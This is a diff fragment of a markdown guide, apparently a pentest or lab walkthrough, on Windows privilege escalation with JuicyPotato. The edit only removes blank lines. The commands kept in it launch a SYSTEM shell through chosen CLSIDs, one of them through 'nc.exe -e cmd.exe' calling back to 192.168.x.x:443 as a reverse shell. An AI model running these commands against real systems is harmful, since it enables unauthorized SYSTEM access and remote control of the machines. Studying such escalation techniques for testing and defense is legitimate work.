@@ -96,25 +96,19 @@ Now we've found valid CLSID for SYSTEM we can use that CLSID and get system shel
 ## Using Powershell shell.bat
 
 ```markdown
-
 c:\\Users\\Bob\\Desktop\\JuicyPotato.exe -l 1234 -p c:\\Users\\Bob\\Desktop\\shell.bat -t * -c {c980e4c2-c178-4572-935d-a8a429884806} 
-
 ```
 
 ## Using nc.exe
 
 ```markdown
-
 c:\\Users\\Bob\\Desktop\\jp32.exe -l 443 -p c:\\windows\\system32\\cmd.exe -a "/c c:\\Users\\Bob\\Desktop\\nc.exe -e cmd.exe 192.168.x.x 443" -t * -c {659cdea7-489e-11d9-a9cd-000d56965251}
-
 ```
 
 ## Using shell.exe 
 
 ```markdown
-
 c:\\Users\\Bob\\Desktop\\jp32.exe -l 443 -p c:\\windows\\system32\\cmd.exe -a "/c c:\\Users\\Bob\\Desktop\\shell.exe" -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
-
 ```
 
 ![OnPaste 20220606-195312](https://user-images.githubusercontent.com/106917304/172180304-91e48267-0a99-43cd-bd33-0f13c36c90d9.png)
